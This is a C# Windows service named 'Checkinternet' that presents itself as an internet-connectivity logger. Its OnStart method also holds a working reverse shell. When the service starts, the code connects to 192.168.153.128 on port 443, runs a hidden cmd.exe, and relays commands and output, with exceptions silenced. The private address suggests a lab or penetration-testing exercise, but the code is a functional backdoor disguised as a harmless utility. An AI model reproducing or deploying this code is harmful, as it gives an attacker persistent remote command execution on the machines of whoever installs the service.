using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Timers;

namespace Checkinternet
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer(); // name space(using System.Timers;)
        public Service1()
        {
            InitializeComponent();
        }
        static StreamWriter streamWriter;
        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 5000; //number in milisecinds 
            timer.Enabled = true;
            // Code for reverse shell
            try
            {
                using (TcpClient client = new TcpClient("192.168.153.128", 443))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                //strInput.Append("\n");
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // silence is golden
            }

        }
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception)
                {
                    // silence is golden
                }
            }
        }



        public static bool Isconnected = false;
        //static StreamWriter streamWriter;

        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);
        }
        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/"))
                    return true;
            }
            catch
            {
                return false;
            }
        }
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
            bool connection = CheckForInternetConnection();
            if (connection == true)
            {
                WriteToFile("You are online at " + DateTime.Now);
            }
            else
            {
                WriteToFile("You are offline at " + DateTime.Now);
            }
        }

        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to. 
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

    }
}
